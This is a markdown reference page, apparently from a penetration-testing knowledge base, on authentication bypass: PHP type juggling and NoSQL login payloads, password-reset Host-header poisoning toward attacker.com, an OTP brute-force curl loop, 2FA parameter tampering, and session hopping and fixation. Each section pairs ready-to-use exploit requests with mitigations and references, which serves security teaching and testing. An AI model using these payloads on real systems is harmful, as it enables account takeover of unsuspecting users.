# Authentication Bypass

Techniques for bypassing login forms, password reset flows, and session enforcement
mechanisms. These are not SQLi-based bypasses (see [sqli.md](sqli.md) for those) — this
page covers logic flaws, type confusion, 2FA bypass, and weak password reset.

---

## Logic Flaw Login Bypass

**Category:** Authentication Bypass
**Severity context:** High — complete account takeover with minimal technical skill.

### How to identify it
Review the authentication logic source code if available, or probe the login endpoint with
edge-case inputs: empty strings, array parameters, `null`, `undefined`, magic strings like
`true` or `1` in password fields.

### How it works
Some frameworks mishandle non-string types in comparison logic. For example, passing
`password[]=` (PHP array) to a comparison like `strcmp($input, $stored_hash)` causes
`strcmp` to return `null` instead of `false`, which `!=`/`==` may treat as success.
Similarly, MongoDB `$ne` injection or JavaScript `[object Object]` bypasses can trigger
unintended truthiness.

### Exploitation
```http
# PHP strcmp() bypass — array parameter causes null return
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[]=

# MongoDB NoSQL injection — $ne matches any non-null
POST /login
Content-Type: application/json

{"username": "admin", "password": {"$ne": ""}}

# Type juggling — magic hashes (PHP loose comparison)
# Any password hash starting with "0e" followed by digits
# e.g. stored hash: 0e12345... → "0e" + digits
# If you can find any value that hashes to "0eXXXX..." the comparison returns true
# Known: 240610708 (MD5) → 0e462097431907509062... matches 0e...
password=240610708

# Empty password / null byte edge cases
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password=
```

### Mitigation
Use strict comparison operators (`===` in PHP, `===` in JavaScript). Validate parameter
types before comparison — reject arrays where strings are expected. Use framework-native
authentication helpers rather than writing raw comparison logic.

### References
- [OWASP: Authentication Bypass](https://owasp.org/www-community/attacks/Authentication_Bypass)
- [PHP type juggling vulnerabilities](https://owasp.org/www-pdf-archive/PHPMagicTricks.pdf)

---

## Weak Password Reset

**Category:** Authentication Bypass
**Severity context:** High — take over any account if reset token is guessable or not
bound to the user.

### How to identify it
Intercept the password reset flow: request a reset, examine the URL/email for the token
format. Look for patterns: timestamps, sequential IDs, short tokens, or user-controlled
fields in the reset request.

### How it works
A secure reset token should be a long, cryptographically random value tied to a specific
user session. Common flaws: token is based on `email+timestamp MD5` (guessable), token
is a sequential integer (enumerable), token is sent in the URL and never invalidated
(reusable), or the user ID is passed alongside the token and changeable.

### Exploitation
```http
# Token replay — same token works twice
GET /reset?token=abc123
GET /reset?token=abc123    # second use still works

# Predictable token
# If token = MD5(email + timestamp), compute tokens for the target

# Host header injection — reset link uses Host header
POST /reset
Host: attacker.com

email=admin@target.com
# Admin receives: "Click here to reset: http://attacker.com/reset?token=..."
# You capture the token from your server logs

# User-controlled user parameter
POST /api/reset
Content-Type: application/json

{"email": "attacker@evil.com", "user": "admin"}
# Password reset link is sent to attacker@evil.com for admin's account

# Change password without old password (no current_password check)
POST /change-password
Content-Type: application/json

{"new_password": "hacked123"}
```

### Mitigation
Generate reset tokens with `random_bytes()` / `secrets.token_urlsafe()` (≥ 128 bits).
Bind tokens to both the user and a short expiry. Invalidate after use. Never accept a
user-controlled user ID in the reset request — derive it from the token server-side.

### References
- [PortSwigger: Password reset poisoning](https://portswigger.net/web-security/authentication/other-mechanisms/password-reset-poisoning)
- [OWASP: Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)

---

## 2FA / MFA Bypass

**Category:** Authentication Bypass
**Severity context:** High — defeats second factor without compromising the TOTP seed or SMS.

### How to identify it
Map the full authentication flow. Look for: an API call that skips 2FA, a "remember this
device" cookie that can be forged, or a race condition where the 2FA check and session
grant happen in separate steps.

### How it works
Many 2FA implementations check the code but fail to enforce the check on every flow:
- The OTP verification endpoint and the session creation endpoint are separate — race
  the session creation before the OTP check completes
- A `verified` boolean in the request body can be set to `true`
- The 2FA is only enforced on the web UI but not on the API used by the mobile app
- The "remember this device" cookie is a simple HMAC or even a static value

### Exploitation
```http
# Bypass via body parameter manipulation
POST /verify-2fa
Content-Type: application/json

{"code": "123456", "verified": true}

# Race condition — send session-create request before 2FA check
POST /verify-2fa
{"code": "123456"}
# Simultaneously:
POST /session
# If session is created before validation completes, you're in

# Skip to authenticated endpoints directly
GET /profile
Cookie: session=                               # empty session → some apps grant access

# OAuth / social login — skip 2FA by using a provider that doesn't enforce it
# If the app requires 2FA for direct login but not for Google SSO, use SSO

# Brute-force short TOTP (6 digits = 1M combinations, many apps lack rate limiting)
for i in $(seq 0 999999); do
  curl -X POST -d "code=$(printf '%06d' $i)" http://target.com/verify-2fa
done
```

### Mitigation
Enforce 2FA on every session creation path (including API and SSO flows). Use device
fingerprinting and risk-based authentication. Rate-limit OTP attempts aggressively
(3–5 tries then lockout). Never trust client-supplied `verified` booleans.

### References
- [PortSwigger: 2FA bypass](https://portswigger.net/web-security/authentication/multi-factor)
- [OWASP: Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)

---

## Session Manipulation

**Category:** Authentication Bypass
**Severity context:** High — impersonate any user with a predictable or stolen session token.

### How to identify it
Analyze session tokens for patterns: Base64-encoded values (decode to see if they contain
the user ID), sequential numbers, timestamps, short length, or no entropy.

### How it works
Session tokens should be opaque, random, and server-stored. Common failures:
- Token is `user_id:timestamp:hmac` — predictable, and if HMAC key is static or empty,
  you can forge tokens
- Token is just a sequential integer (e.g. `session=1001` → change it to `1000` for the
  previous user)
- Token never changes after login (session fixation)
- Logout does not invalidate the token server-side

### Exploitation
```bash
# Sequential ID — session hopping
curl -b "session=1001" http://target.com/profile   # your session
curl -b "session=1000" http://target.com/profile   # previous user's session

# Base64 decode
echo "eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==" | base64 -d
# {"user":"admin","role":"admin"} → forge and re-encode

# JWT without signature verification (see jwt-attacks.md for depth)
# Change algorithm to "none" or strip signature

# Session fixation — force a known session ID on the victim
# 1. Attacker gets a session:  session=known123
# 2. Attacker sends victim a link: http://target.com/?sessionid=known123
# 3. Victim logs in — now attacker's session=known123 is authenticated
```

### Mitigation
Use server-side sessions with cryptographically random IDs. Regenerate session ID on
login to prevent fixation. Invalidate server-side on logout and timeout. Never encode
sensitive data (user ID, role) in the session cookie itself without tamper-proof signing.

### References
- [OWASP: Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger: Session handling](https://portswigger.net/web-security/authentication/session)
